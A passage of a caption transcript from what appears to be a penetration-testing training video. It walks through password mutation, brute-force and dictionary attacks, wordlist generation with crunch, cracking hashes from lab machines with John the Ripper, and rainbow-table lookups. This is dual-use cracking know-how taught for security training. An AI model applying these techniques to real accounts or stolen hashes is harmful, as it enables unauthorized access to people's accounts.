--> 00:07:46.430\n&gt;&gt; Perfect.\n\n175\n00:07:46.430 --> 00:07:47.710\nWelcome to password mutation.\n\n176\n00:07:47.710 --> 00:07:50.645\nJust adding some changes to the password,\nso\n\n177\n00:07:50.645 --> 00:07:55.910\nthat they're still easy to remember, but\naren't just a word in a file, right?\n\n178\n00:07:55.910 --> 00:08:00.785\nSo, that can definitely affect your\npassword cracking because now There's\n\n179\n00:08:00.785 --> 00:08:05.070\ngonna be a set of characters maybe,\nthat you'll have to deal with.\n\n180\n00:08:05.070 --> 00:08:09.230\n&gt;&gt; So did I completely avoid your ability\nto break my password by adding that one?\n\n181\n00:08:09.230 --> 00:08:10.660\n&gt;&gt; Yeah, unfortunately no.\n\n182\n00:08:10.660 --> 00:08:14.530\nYou didn't do that because I can\naccount for that as the attacker.\n\n183\n00:08:14.530 --> 00:08:18.760\nI can say, I can write a script,\nthat says look through this file, and\n\n184\n00:08:18.760 --> 00:08:21.520\nadd these characters,\nto the beginning of it, right.\n\n185\n00:08:21.520 --> 00:08:27.490\nSo if I think maybe I've opened\na free account and it says you must\n\n186\n00:08:27.490 --> 00:08:31.400\nhave two numbers at the beginning of your\npassword or it's not a valid password.\n\n187\n00:08:31.400 --> 00:08:35.140\nOkay now I know some of their\npassword policy, use two numbers.\n\n188\n00:08:35.140 --> 00:08:36.800\nOr Bob works there and\n\n189\n00:08:36.800 --> 00:08:40.560\nhe's like man they're killing\nme with this password business.\n\n190\n00:08:40.560 --> 00:08:44.370\nThey make you have to use one special\ncharacter, one upper case and\n\n191\n00:08:44.370 --> 00:08:46.560\nthen a number at the end, is that a fact?\n\n192\n00:08:46.560 --> 00:08:50.190\nThat's wonderful and now that I\nknow that so you can build that up.\n\n193\n00:08:50.190 --> 00:08:53.490\nLet me see what else do you\nwanna know about mutation,\n\n194\n00:08:53.490 --> 00:08:57.270\nthey can be at the beginning, and\nthe middle, at the end of the password,\n\n195\n00:08:57.270 --> 00:09:01.549\ntypically there's usually one special\ncharacter, upper and lower case.\n\n196\n00:09:02.820 --> 00:09:04.680\nAnd usually a number associated as well.\n\n197\n00:09:04.680 --> 00:09:06.370\nAnd like I said,\nyou can use a Bash script or\n\n198\n00:09:06.370 --> 00:09:09.240\nany other third party tool\nto help you out with that.\n\n199\n00:09:09.240 --> 00:09:13.110\n&gt;&gt; Yeah, a lot of people tend to think,\nif I replace that a with an @,\n\n200\n00:09:13.110 --> 00:09:17.150\nit's no longer gonna match those\ndictionary files I'm safe.\n\n201\n00:09:17.150 --> 00:09:21.250\nWell, the pen testers, the attackers,\nthey know these techniques as well.\n\n202\n00:09:21.250 --> 00:09:24.230\nSo you just take that dictionary\nfile you just made and then\n\n203\n00:09:24.230 --> 00:09:28.430\nyou've probably heard of a tool called\nfind and replace in most text editors.\n\n204\n00:09:28.430 --> 00:09:32.510\nAnd so you go through and you take that\nfile and you replace all a's with @ and\n\n205\n00:09:32.510 --> 00:09:33.530\nsave it as a new file.\n\n206\n00:09:33.530 --> 00:09:35.125\nNow tack it onto the first file,\n\n207\n00:09:35.125 --> 00:09:38.765\nyou've got a second dictionary\nthat has at's instead of a's.\n\n208\n00:09:38.765 --> 00:09:41.175\nSo you're gonna be able\nto find those passwords.\n\n209\n00:09:41.175 --> 00:09:42.245\n&gt;&gt; That's it.\n\n210\n00:09:42.245 --> 00:09:44.565\nSo that's basically dictionary attacking.\n\n211\n00:09:44.565 --> 00:09:48.885\nSo we've got a file, passwords are inside\nof it, it tries those passwords, and\n\n212\n00:09:48.885 --> 00:09:50.355\nsees if they work or not.\n\n213\n00:09:50.355 --> 00:09:53.065\nOkay, that's pretty straight forward,\npretty simple.\n\n214\n00:09:53.065 --> 00:09:54.490\nI like dictionary attacks.\n\n215\n00:09:54.490 --> 00:09:59.200\nThen there's brute force attacks, where\nit says okay we're gonna play a game and\n\n216\n00:09:59.200 --> 00:10:01.075\nit's gonna be called the long wait.\n\n217\n00:10:01.075 --> 00:10:04.090\n&gt;&gt; [LAUGH]\n&gt;&gt; Cuz you tried dictionaries a brute\n\n218\n00:10:04.090 --> 00:10:07.440\nforce attack, that's typically what\nit ends up being, a long wait.\n\n219\n00:10:07.440 --> 00:10:11.480\nBecause what it does is it just tries,\nyou give it a set of characters.\n\n220\n00:10:12.730 --> 00:10:16.220\nThe script or the program, whatever\nit's gonna use to crack it's password.\n\n221\n00:10:16.220 --> 00:10:20.100\nAnd it tries every possible\ncombination of those characters\n\n222\n00:10:20.100 --> 00:10:23.340\nstarting with single characters\nto double characters.\n\n223\n00:10:23.340 --> 00:10:27.570\nSo if I give it six characters, it will\neventually work itself with exponential.\n\n224\n00:10:27.570 --> 00:10:29.380\nContinues to grow, and\n\n225\n00:10:29.380 --> 00:10:33.820\ntrying every possible combination of\nthose characters within that given set.\n\n226\n00:10:33.820 --> 00:10:36.500\nThat as you can imagine\ncan take a very long time.\n\n227\n00:10:36.500 --> 00:10:39.230\nNot even, and it's not guaranteed to work.\n\n228\n00:10:39.230 --> 00:10:43.980\nBecause if you have a sufficiently long\npassword, it will just take too long and\n\n229\n00:10:43.980 --> 00:10:45.670\nthe person will die.\n\n230\n00:10:45.670 --> 00:10:46.953\nWaiting for it to end, right?\n\n231\n00:10:46.953 --> 00:10:48.940\n[LAUGH]\n&gt;&gt; Looking at the scary thing is faster\n\n232\n00:10:48.940 --> 00:10:55.450\ncomputers get the less time it takes to go\nthrough all those possible combinations.\n\n233\n00:10:55.450 --> 00:10:58.730\nI think last time I looked we\nwere dealing with Pentiums,\n\n234\n00:10:58.730 --> 00:11:02.060\nthey were firing off hundreds of\nthousands of guesses per second.\n\n235\n00:11:02.060 --> 00:11:03.680\n&gt;&gt; Right.\n&gt;&gt; Per second, so\n\n236\n00:11:03.680 --> 00:11:06.770\nyou're thinking wow,\nit can go through a lot of guesses.\n\n237\n00:11:06.770 --> 00:11:10.530\nAaa, aab, aac, all the way up.\n\n238\n00:11:10.530 --> 00:11:11.720\nAnd sure, it can take a long time, but\n\n239\n00:11:11.720 --> 00:11:15.198\nnot as long as you might think depending\nagain on how long that password is.\n\n240\n00:11:15.198 --> 00:11:20.140\n&gt;&gt; Yeah, so\nusing a sufficiently long password\n\n241\n00:11:20.140 --> 00:11:23.500\nwill help protect against\na brute force attack.\n\n242\n00:11:23.500 --> 00:11:26.350\nThere's also something called\nkey space brute forcing and\n\n243\n00:11:26.350 --> 00:11:27.960\nthat's kind of on our end as pen testers.\n\n244\n00:11:27.960 --> 00:11:31.400\nWe want to create\nbasically a dictionary file\n\n245\n00:11:31.400 --> 00:11:35.800\nthat has all those possible character\ncombinations inside of it so\n\n246\n00:11:35.800 --> 00:11:38.260\nit's not generating it and\nworking it through that way.\n\n247\n00:11:38.260 --> 00:11:40.840\nIt's easier for it to just read\na file that already has them.\n\n248\n00:11:40.840 --> 00:11:44.400\nThe problem with doing this is creating\nthis file is it can get very large\n\n249\n00:11:44.400 --> 00:11:45.530\nvery quickly, okay?\n\n250\n00:11:45.530 --> 00:11:50.280\nSo, I will warn you really\nagainst doing this.\n\n251\n00:11:50.280 --> 00:11:51.870\nYou need to put some constraints on it.\n\n252\n00:11:51.870 --> 00:11:55.960\nBut I'll show you how to\nuse a tool called crunch so\n\n253\n00:11:55.960 --> 00:11:58.460\nthat you can create this type of file.\n\n254\n00:11:58.460 --> 00:12:00.630\nLet's go ahead and jump in here.\n\n255\n00:12:00.630 --> 00:12:02.190\nLet's run crunch.\n\n256\n00:12:02.190 --> 00:12:06.370\nSo just like it sounds\nno funny speak here.\n\n257\n00:12:06.370 --> 00:12:07.390\nCrunch like that.\n\n258\n00:12:07.390 --> 00:12:12.500\nThen you say what is the minimum length,\nwhat is the maximum length of characters.\n\n259\n00:12:12.500 --> 00:12:14.610\nRight.\nSo I'm gonna keep it small say\n\n260\n00:12:14.610 --> 00:12:16.510\nfour, and four.\n\n261\n00:12:16.510 --> 00:12:17.560\nSo minimum and maximum.\n\n262\n00:12:18.900 --> 00:12:20.760\nIt's gonna be four characters.\n\n263\n00:12:20.760 --> 00:12:23.660\nAnd then I will tell it\nit's a character set.\n\n264\n00:12:23.660 --> 00:12:28.790\nAnd I'll just say 0123456789 and\nend in ABC, just like that.\n\n265\n00:12:28.790 --> 00:12:30.590\nAnd those are capital ABCs not lower abcs.\n\n266\n00:12:30.590 --> 00:12:33.525\nI could throw those in as well but\nI don't want it to get too crazy.\n\n267\n00:12:33.525 --> 00:12:35.850\n-0 for output.\n\n268\n00:12:35.850 --> 00:12:37.780\nWhere do I want to store this file?\n\n269\n00:12:37.780 --> 00:12:44.590\nAnd I'll call it crunchy.txt,\nlike that, and there we go.\n\n270\n00:12:44.590 --> 00:12:48.130\nCranking away, crunch will now\ngenerate the number of lines, and\n\n271\n00:12:48.130 --> 00:12:50.280\nit generated the outputs.\n\n272\n00:12:50.280 --> 00:12:52.980\nSo let's do an ls-al.\n\n273\n00:12:52.980 --> 00:12:54.390\nWe see, where is crunchy?\n\n274\n00:12:54.390 --> 00:12:59.564\nThere it is, and\nlook at the size with four characters.\n\n275\n00:12:59.564 --> 00:13:03.175\nIf I do ALF probably make it a little,\n\n276\n00:13:03.175 --> 00:13:08.484\nyeah why did that not do,\nyou're supposed to work.\n\n277\n00:13:08.484 --> 00:13:10.480\nIt's ALH, I'm an idiot.\n\n278\n00:13:10.480 --> 00:13:11.270\nThere we go.\n\n279\n00:13:11.270 --> 00:13:13.880\nMaybe it's a lower case h.\n\n280\n00:13:13.880 --> 00:13:15.220\nHuman readable man come on.\n\n281\n00:13:15.220 --> 00:13:16.368\nThere we go.\n\n282\n00:13:16.368 --> 00:13:22.050\nSo crunch used a hundred and forty\nkilobytes, at RAM a second, two seconds.\n\n283\n00:13:22.050 --> 00:13:24.270\nIt was very fast, and was on four carries.\n\n284\n00:13:24.270 --> 00:13:28.270\nif I got to six, I go to eight, I start\ngetting to twelve, this becomes gigs and\n\n285\n00:13:28.270 --> 00:13:30.140\nterabytes, very quickly.\n\n286\n00:13:30.140 --> 00:13:31.820\nSo be careful on running crunch.\n\n287\n00:13:31.820 --> 00:13:35.430\n&gt;&gt; It's an exponential growth when\nyou start adding a single character.\n\n288\n00:13:35.430 --> 00:13:37.390\nIt doesn't just double\nthe number of possibilities.\n\n289\n00:13:37.390 --> 00:13:40.630\nIt's an exponential increment\nof number possibilities.\n\n290\n00:13:40.630 --> 00:13:43.280\nSo you get up to eight,\nit's not gonna take double the time.\n\n291\n00:13:43.280 --> 00:13:45.140\nIt's gonna take a lot longer.\n\n292\n00:13:45.140 --> 00:13:47.430\n&gt;&gt; Yeah couple of other options I\nwanna show you about crunch just so\n\n293\n00:13:47.430 --> 00:13:48.730\nthat you're aware of them.\n\n294\n00:13:48.730 --> 00:13:50.700\nLet's open the man page for man crunch.\n\n295\n00:13:52.740 --> 00:13:55.080\nCrunch, there we go.\n\n296\n00:13:55.080 --> 00:13:59.410\nI wanted to show you the -F option,\nwhich is right here.\n\n297\n00:14:00.440 --> 00:14:04.050\nSo you can use a character set,\ninstead of telling it what characters.\n\n298\n00:14:05.060 --> 00:14:09.165\nIn that line you can just say,\nlook to this character set in this file.\n\n299\n00:14:09.165 --> 00:14:13.167\nThis is how it works, -f,\nthen /path to charset, so\n\n300\n00:14:13.167 --> 00:14:16.650\nwherever you keep that\ncharacter set saved at.\n\n301\n00:14:17.770 --> 00:14:20.790\nAnd then it specifies that\ncharacter set from that list.\n\n302\n00:14:20.790 --> 00:14:25.990\nAlso if you look for\n-t option, there we go.\n\n303\n00:14:25.990 --> 00:14:28.580\nThis specifies a pattern.\n\n304\n00:14:28.580 --> 00:14:31.170\nSo working with that mutation, right?\n\n305\n00:14:31.170 --> 00:14:35.987\nIf I want to insert lowercase, so I've\ngot maybe a word list, and you want to\n\n306\n00:14:35.987 --> 00:14:40.731\nchange the first letter to an upper case,\nright, or use a character set and\n\n307\n00:14:40.731 --> 00:14:45.659\nadd the upper case a at the beginning or\nzeros or one, numbers, characters.\n\n308\n00:14:45.659 --> 00:14:49.492\nYou can see if you use an at symbol\nwill insert a lower case character,\n\n309\n00:14:49.492 --> 00:14:54.055\na comma will insert upper case characters,\npercent signs will insert numbers and\n\n310\n00:14:54.055 --> 00:14:56.890\nthe carat will insert\na symbol of some sort.\n\n311\n00:14:56.890 --> 00:14:59.060\nAll right and\nthen you just feed that to it.\n\n312\n00:14:59.060 --> 00:15:00.050\nAnd there you go.\n\n313\n00:15:00.050 --> 00:15:05.100\nSo kind of gives you an example\nright here where that will add\n\n314\n00:15:05.100 --> 00:15:09.470\nlower case characters to the beginning and\nending of that password, okay.\n\n315\n00:15:10.660 --> 00:15:12.700\nSo there we go, couple of options for you.\n\n316\n00:15:12.700 --> 00:15:15.640\nLike I said be careful with crunch,\nI don't want you eating up your entire\n\n317\n00:15:15.640 --> 00:15:19.600\nhard drive cuz you accidentally\nput 46 characters [LAUGH].\n\n318\n00:15:19.600 --> 00:15:22.090\nIt will get a little crazy here.\n\n319\n00:15:22.090 --> 00:15:25.400\nAll right,\nlet's move to some more sophisticated\n\n320\n00:15:25.400 --> 00:15:30.200\npassword attacking tools and\ncracking tools.\n\n321\n00:15:30.200 --> 00:15:31.360\nLet's talk John the Ripper.\n\n322\n00:15:31.360 --> 00:15:35.330\nJohn the Ripper is an oldie but\na goodie, it is still a fan favorite.\n\n323\n00:15:35.330 --> 00:15:37.430\nIt's been around since\nI've started doing this.\n\n324\n00:15:37.430 --> 00:15:40.170\nAnd that was back in 98?\n\n325\n00:15:40.170 --> 00:15:41.530\nSo when I got into like thinking,\n\n326\n00:15:41.530 --> 00:15:45.440\naw I want to be a hacker man, it's\ngoing to be awesome, that was in 1998.\n\n327\n00:15:45.440 --> 00:15:49.787\nI was eighteen, and John the Ripper\nwas already like a tried and\n\n328\n00:15:49.787 --> 00:15:52.668\ntrue staple of every hacker's toolkit.\n\n329\n00:15:52.668 --> 00:15:56.587\nIt still is,\nthat's a testament to it's brand.\n\n330\n00:15:56.587 --> 00:15:58.789\nYou'll want to get familiar with John.\n\n331\n00:15:58.789 --> 00:15:59.400\nLet's do that.\n\n332\n00:15:59.400 --> 00:16:00.477\nLet's get familiar with John.\n\n333\n00:16:00.477 --> 00:16:02.955\nLet's give him my computer here.\n\n334\n00:16:02.955 --> 00:16:06.120\nI do have, I think I made it in this test.\n\n335\n00:16:06.120 --> 00:16:09.960\nLet's look in there.\n\n336\n00:16:09.960 --> 00:16:12.220\nSo I've got user2, or\nstolen_pass, that's it.\n\n337\n00:16:12.220 --> 00:16:13.064\nThat's the one I wanted to see.\n\n338\n00:16:13.064 --> 00:16:15.918\nI've got stolen_pass like cats,\n\n339\n00:16:15.918 --> 00:16:19.290\nstolen_pass there are some\npasswords in here.\n\n340\n00:16:19.290 --> 00:16:22.260\nThere are their hash values, right?\n\n341\n00:16:22.260 --> 00:16:23.180\nJust like this guy right here.\n\n342\n00:16:23.180 --> 00:16:26.070\nIt's one of the, I created so\nI grabbed these passwords.\n\n343\n00:16:26.070 --> 00:16:28.860\nI'll show you how to do\nthat in a little bit.\n\n344\n00:16:28.860 --> 00:16:32.770\nFrom a Windows machine,\nI wanna crack that password right?\n\n345\n00:16:32.770 --> 00:16:33.390\nSo what do I do?\n\n346\n00:16:34.420 --> 00:16:37.669\nI can run it through Johnny boy.\n\n347\n00:16:37.669 --> 00:16:42.154\nWhat you do is you just basically John and\nthen do I wanna do that one,\n\n348\n00:16:42.154 --> 00:16:45.473\nlet me look at these other\nones real quickly here.\n\n349\n00:16:45.473 --> 00:16:49.080\nLet me cats user 2 cuz I\nwanted to play with them.\n\n350\n00:16:49.080 --> 00:16:51.520\nNo it's the same file,\nokay that's what I did.\n\n351\n00:16:52.700 --> 00:16:56.628\nSo let's do it, John, and\nthen just whatever that file is.\n\n352\n00:16:56.628 --> 00:16:59.620\nI'll do stolenpass.TXT.\n\n353\n00:16:59.620 --> 00:17:03.450\nSo It's cranking away, it says two\npasswords loaded into the hash,\n\n354\n00:17:03.450 --> 00:17:06.070\nremaining one password hash,\nand it's looking for that.\n\n355\n00:17:06.070 --> 00:17:09.910\nIt's basically trying to\nbrute force that system.\n\n356\n00:17:09.910 --> 00:17:14.930\nI could sit here an let it crack away\nuntil it finds what that password is,\n\n357\n00:17:14.930 --> 00:17:16.110\nthat could take a while.\n\n358\n00:17:16.110 --> 00:17:17.320\nMaybe it wont, maybe it will.\n\n359\n00:17:17.320 --> 00:17:18.190\nI don't wanna wait for it,\n\n360\n00:17:18.190 --> 00:17:21.820\nI just wanna show that's basically\nthat's how you work John.\n\n361\n00:17:21.820 --> 00:17:23.570\nJust the very lowest level.\n\n362\n00:17:23.570 --> 00:17:25.146\nAt it's core, it's a brute force.\n\n363\n00:17:25.146 --> 00:17:31.200\nBut it will run word files and\ndo dictionary attacks as well.\n\n364\n00:17:32.550 --> 00:17:35.970\nSo if I have a word list\nI can throw that at it.\n\n365\n00:17:35.970 --> 00:17:37.150\nI do have a word list.\n\n366\n00:17:37.150 --> 00:17:39.550\nI do have RockU so let me see here.\n\n367\n00:17:39.550 --> 00:17:41.688\nDo I have RockU here.\n\n368\n00:17:41.688 --> 00:17:45.690\nNo let me locate.\n\n369\n00:17:45.690 --> 00:17:47.810\nIt's in the previous directory.\n\n370\n00:17:47.810 --> 00:17:48.950\nSo I'll know that's there.\n\n371\n00:17:48.950 --> 00:17:52.660\nSo John, basically the same command,\nstolen_pass.text.\n\n372\n00:17:52.660 --> 00:17:59.170\nBut some will say wordList like that\nequals whatever my word list is.\n\n373\n00:17:59.170 --> 00:18:05.921\nSo I can say, give it the path\nto that wordList/root/attack,\n\n374\n00:18:05.921 --> 00:18:09.790\nof course I can't spell it out.\n\n375\n00:18:09.790 --> 00:18:14.360\nWhat does that say, let me just\ncopy it into here, it'll be easier.\n\n376\n00:18:14.360 --> 00:18:20.408\nCp let me go back, do I have one in here.\n\n377\n00:18:20.408 --> 00:18:25.676\n[SOUND] No hashes is there a hash, just\nlooking to see if there's a hash in here.\n\n378\n00:18:25.676 --> 00:18:28.245\nMaybe that two hash cat two hash.\n\n379\n00:18:30.212 --> 00:18:32.100\nYeah, that's good.\n\n380\n00:18:32.100 --> 00:18:33.154\nThat will work.\nSo we'll do it here.\n\n381\n00:18:33.154 --> 00:18:37.203\nJohn, Stone.\n\n382\n00:18:37.203 --> 00:18:38.920\nWell that's two hash now.\n\n383\n00:18:38.920 --> 00:18:40.652\nCome on now, [INAUDIBLE].\n\n384\n00:18:40.652 --> 00:18:41.240\n&gt;&gt; Mm-hm.\n\n385\n00:18:41.240 --> 00:18:42.612\n&gt;&gt; Two hash, a text, dash.\n\n386\n00:18:42.612 --> 00:18:47.130\nThere's dashes here.\n\n387\n00:18:47.130 --> 00:18:54.322\nDash word file =rockyou, Space?\n\n388\n00:18:54.322 --> 00:18:57.820\nNo, just rockyou.txt.\n\n389\n00:18:57.820 --> 00:19:01.144\nAnd that should crank\naway to Unknown option.\n\n390\n00:19:01.144 --> 00:19:07.120\nwordfile=, what am I doing on here?\n\n391\n00:19:07.120 --> 00:19:07.950\nIt's wordlist, yeah.\n\n392\n00:19:09.780 --> 00:19:11.250\nThat's my problem.\n\n393\n00:19:11.250 --> 00:19:13.240\nThat's your problem right there Lowrie.\n\n394\n00:19:13.240 --> 00:19:16.980\nThere we go,\nload to passwords and it's done.\n\n395\n00:19:16.980 --> 00:19:23.400\nOnce it's done you can\ndo the john -show and\n\n396\n00:19:23.400 --> 00:19:28.014\nthen tell it what password file you\nwanna do, which is twohash.txt.\n\n397\n00:19:29.900 --> 00:19:32.250\nAnd let's say, three passwords correct.\n\n398\n00:19:32.250 --> 00:19:34.650\nLook at that here's\nthe password right there.\n\n399\n00:19:34.650 --> 00:19:35.510\nPassword 1.\n\n400\n00:19:35.510 --> 00:19:38.950\nSo once it cracks the password\nyou do the dash so option so\n\n401\n00:19:38.950 --> 00:19:40.900\nyou can see what the password is.\n\n402\n00:19:40.900 --> 00:19:44.810\nTypically, since I've already cracked\nthis password it doesn't output it.\n\n403\n00:19:44.810 --> 00:19:46.940\nOnly does it the first time you crack it.\n\n404\n00:19:46.940 --> 00:19:49.350\nEvery other time you have to\nuse the show option to see it.\n\n405\n00:19:49.350 --> 00:19:50.590\nBut the first time you actually break it,\n\n406\n00:19:50.590 --> 00:19:55.390\nit will output it to the screen and\nthat's what it will look like.\n\n407\n00:19:55.390 --> 00:19:59.360\nAll right.\nSo John will also work with mutations.\n\n408\n00:19:59.360 --> 00:20:00.610\nLet's take a look at that.\n\n409\n00:20:00.610 --> 00:20:07.772\nThere is a few cat/etsy/john/john.com.\n\n410\n00:20:07.772 --> 00:20:10.504\nThere is, did I cat it?\n\n411\n00:20:10.504 --> 00:20:12.634\nYeah, I want to open that.\n\n412\n00:20:12.634 --> 00:20:16.280\nN-N-O or let's list it.\n\n413\n00:20:16.280 --> 00:20:17.120\nThere we go.\n\n414\n00:20:17.120 --> 00:20:19.630\nNow we can kind of look through it.\n\n415\n00:20:19.630 --> 00:20:22.750\nThere's the configuration\nfile down in here.\n\n416\n00:20:24.180 --> 00:20:28.040\nThere is areas where you\ncan setup mutations.\n\n417\n00:20:28.040 --> 00:20:30.630\nI know that I think I have to search for\n\n418\n00:20:30.630 --> 00:20:35.990\na string to get you to certain\nspots cuz it's a big file.\n\n419\n00:20:35.990 --> 00:20:36.740\nIt's a big file.\n\n420\n00:20:36.740 --> 00:20:38.430\n&gt;&gt; A lot of cool options in there.\n\n421\n00:20:38.430 --> 00:20:41.440\nSome that are common that you can just\nuncomment to enable those things.\n\n422\n00:20:41.440 --> 00:20:44.800\n&gt;&gt; Yeah, you can kinda see that right\nhere like global build options for\n\n423\n00:20:44.800 --> 00:20:46.190\nmy specific build options.\n\n424\n00:20:46.190 --> 00:20:50.030\nMay be concatenated to this and\nthen if so this is obviously working, but\n\n425\n00:20:50.030 --> 00:20:53.570\nif I wanted to do this for\nNvidia SM 30 and beyond.\n\n426\n00:20:53.570 --> 00:20:56.760\nJava is an extremely powerful\ntool to be honest with you, but\n\n427\n00:20:56.760 --> 00:21:01.670\nwhat's cool is you can add\nyour own rule set to it,\n\n428\n00:21:01.670 --> 00:21:05.210\nso if you wanted to work with a certain\ntype of mutation you could create that.\n\n429\n00:21:05.210 --> 00:21:09.590\nI'll show you a web site\nthat I found had great\n\n430\n00:21:09.590 --> 00:21:12.340\npre built stuff that you\njust add it to the file.\n\n431\n00:21:12.340 --> 00:21:15.616\n&gt;&gt; Nice.\n&gt;&gt; You just drag and drop copy and\n\n432\n00:21:15.616 --> 00:21:22.246\npaste it into the file and\nthen you call it when you run John and\n\n433\n00:21:22.246 --> 00:21:27.446\nit works great and\nI'll show you where that is,\n\n434\n00:21:27.446 --> 00:21:30.826\nthey give a great write up which\n\n435\n00:21:30.826 --> 00:21:37.298\nis\nhttps://www.gracefulsecurity.com/custom-r-\n\n436\n00:21:37.298 --> 00:21:41.247\nules-for-john-the-ripper.\n\n437\n00:21:41.247 --> 00:21:42.942\n&gt;&gt; Check for, you might have missed an r.\n\n438\n00:21:42.942 --> 00:21:46.560\n&gt;&gt; Yeah, I did, but it took me anyway.\n\n439\n00:21:46.560 --> 00:21:48.182\nKeep that in there, there we go.\n\n440\n00:21:50.415 --> 00:21:53.150\nStill didn't spell correctly but\nit's in here somewhere.\n\n441\n00:21:53.150 --> 00:21:53.650\n&gt;&gt; Over there.\n\n442\n00:21:54.730 --> 00:21:56.190\n&gt;&gt; Thank you Michael.\n\n443\n00:21:56.190 --> 00:21:57.970\nI'm a horrible typer\nsince you guys can tell.\n\n444\n00:21:59.250 --> 00:21:59.780\nThere we go.\n\n445\n00:21:59.780 --> 00:22:04.240\nCustom rules for John the Ripper,\nand here's how to insert them,\n\n446\n00:22:04.240 --> 00:22:08.550\nwhat they look like, very simple one\nthat you can do and how to call them.\n\n447\n00:22:08.550 --> 00:22:10.860\nYou go to the second page\nthat's down here at the bottom,\n\n448\n00:22:10.860 --> 00:22:12.290\nit gets a little more complex.\n\n449\n00:22:13.460 --> 00:22:16.390\nYou don't necessarily need to\nknow the ins and outs of this but\n\n450\n00:22:16.390 --> 00:22:19.880\nif you want to you can just read\nthe John man page and everything.\n\n451\n00:22:19.880 --> 00:22:20.830\n&gt;&gt; Hey that's a huge help.\n\n452\n00:22:20.830 --> 00:22:26.130\nAny time you can limit the number of\ncharacters that you're using you can\n\n453\n00:22:26.130 --> 00:22:29.600\ndramatically cut the time it's gonna\ntake to crack those passwords.\n\n454\n00:22:29.600 --> 00:22:31.260\nThat's where social engineering,\n\n455\n00:22:31.260 --> 00:22:36.690\ndoing that initial foot printing about\nthe organization comes into play.\n\n456\n00:22:36.690 --> 00:22:40.220\nBecause if I know that your\npassword policy is only letters and\n\n457\n00:22:40.220 --> 00:22:43.680\nnumbers, I can leave\nout special characters.\n\n458\n00:22:43.680 --> 00:22:47.070\nThat's 32 characters,\npossibilities per character,\n\n459\n00:22:47.070 --> 00:22:50.790\nthat I can leave out that my brute\nforcer now doesn't have to try.\n\n460\n00:22:50.790 --> 00:22:53.930\nSo now we talked about adding a character\nraises the number of possibilities\n\n461\n00:22:53.930 --> 00:22:55.160\nexponentially.\n\n462\n00:22:55.160 --> 00:22:58.230\nWell reducing character sets\ndoes just the opposite.\n\n463\n00:22:58.230 --> 00:23:01.540\nAnd so I can take something that\nmight have taken 10,000 years,\n\n464\n00:23:01.540 --> 00:23:04.400\nmaybe I can bring that down to\nsomething a little more reasonable.\n\n465\n00:23:05.410 --> 00:23:07.295\n&gt;&gt; Exactly right, Mike makes great points.\n\n466\n00:23:07.295 --> 00:23:09.361\nDo hear me he is a smart, smart man.\n\n467\n00:23:09.361 --> 00:23:13.783\nAll right so, kind of the ins and outs of\nJohn, you do wanna get a grasp of that,\n\n468\n00:23:13.783 --> 00:23:17.749\ngiving you the basic services so\nthat you can springboard from there.\n\n469\n00:23:17.749 --> 00:23:20.423\nMan pages are our friends ladies and\ngentlemen but\n\n470\n00:23:20.423 --> 00:23:22.975\nit's not too difficult\nonce you figure it out.\n\n471\n00:23:22.975 --> 00:23:26.475\nThat's not the only game in town,\nthere's others in\n\n472\n00:23:26.475 --> 00:23:30.870\nif you go into the applications\nthere's a password attacks area.\n\n473\n00:23:30.870 --> 00:23:31.880\nYou'll notice there's John.\n\n474\n00:23:31.880 --> 00:23:35.300\nJohnnie is the frontend GUI for\nJohn the Ripper, so\n\n475\n00:23:35.300 --> 00:23:37.510\nthat's nice to know that's there.\n\n476\n00:23:37.510 --> 00:23:41.090\nIncracked, ophcracked, yeah I guess\nit's ophcracked or offcracked.\n\n477\n00:23:41.090 --> 00:23:42.760\n&gt;&gt; I call it offcracked, but\nI don't know if that's right.\n\n478\n00:23:42.760 --> 00:23:43.670\n&gt;&gt; Yeah, something like that.\n\n479\n00:23:43.670 --> 00:23:47.810\nIt's basically derivation of L0phtCrack,\nwhich is now a pay service.\n\n480\n00:23:47.810 --> 00:23:50.092\nIt used to be free,\nyou could download it, it was awesome.\n\n481\n00:23:50.092 --> 00:23:52.676\nThen they started saying hey you know\nwe've got a great tool here we should\n\n482\n00:23:52.676 --> 00:23:53.644\ncharge money for it [LAUGH].\n\n483\n00:23:53.644 --> 00:23:58.016\nBut then off cracked came out and\nyou can use that just click on that.\n\n484\n00:23:58.016 --> 00:24:03.051\nAnd then you go you load in your hashes,\nyou load in your tables,\n\n485\n00:24:03.051 --> 00:24:06.960\nand you hit crack and\noff you go right very cool.\n\n486\n00:24:06.960 --> 00:24:09.600\nAnother one here I think was just\n\n487\n00:24:09.600 --> 00:24:14.440\nworth mentioning password\nattacks password attacks.\n\n488\n00:24:14.440 --> 00:24:19.370\nRainbow tables basically a huge tables\nthat have been prebuilt,that you\n\n489\n00:24:19.370 --> 00:24:21.448\ncan telnet if you go the space.\n\n490\n00:24:21.448 --> 00:24:22.060\n[LAUGH].\n\n491\n00:24:22.060 --> 00:24:22.643\n&gt;&gt; Yeah.\n&gt;&gt; But\n\n492\n00:24:22.643 --> 00:24:27.098\nonline services will provide them for\nyou, just go on and look for\n\n493\n00:24:27.098 --> 00:24:32.449\nrainbow tables online password cracking\nutilities that will do this for you.\n\n494\n00:24:32.449 --> 00:24:37.290\nYou just drag and drop your hash,put\nit in there,they are pre-run.\n\n495\n00:24:37.290 --> 00:24:40.250\nHashing algorithms, looking for the same.\n\n496\n00:24:40.250 --> 00:24:43.040\nSo if your hash string is xyz,\n\n497\n00:24:43.040 --> 00:24:47.940\nit's found every permutation that\ncomes up with xyz as its hash output.\n\n498\n00:24:47.940 --> 00:24:50.900\nAnd it can run through\nit extremely quickly.\n\n499\n00:24:50.900 --> 00:24:53.460\nReducing the amount of time it takes for\nyou to do that.\n\n500\n00:24:53.460 --> 00:24:56.090\nAnd I can show you something like that.\n\n501\n00:24:56.090 --> 00:24:59.339\nLet me so, let's do this.\n\n502\n00:24:59.339 --> 00:25:02.701\nLet me go back into here, let me cd and\n\n503\n00:25:02.701 --> 00:25:07.480\ncd into Kioptrics cuz I know\nwe grabbed those creds.\n\n504\n00:25:07.480 --> 00:25:11.662\nLet me cat creds.\n\n505\n00:25:11.662 --> 00:25:14.739\nAnd we've got these hashes.\n\n506\n00:25:14.739 --> 00:25:17.470\nSo I'm gonna grab that, copy.\n\n507\n00:25:18.920 --> 00:25:22.550\nI'll go out to the Internet.\n\n508\n00:25:22.550 --> 00:25:27.790\nConnect, open my browser and\n\n509\n00:25:27.790 --> 00:25:32.510\nI've got this cool\nMD5 Online site right here.\n\n510\n00:25:32.510 --> 00:25:34.030\nI just drop that.\n\n511\n00:25:34.030 --> 00:25:34.530\nPaste.\n\n512\n00:25:36.889 --> 00:25:40.743\nType in my CAPTCHA,\nwhich is lidless it looks 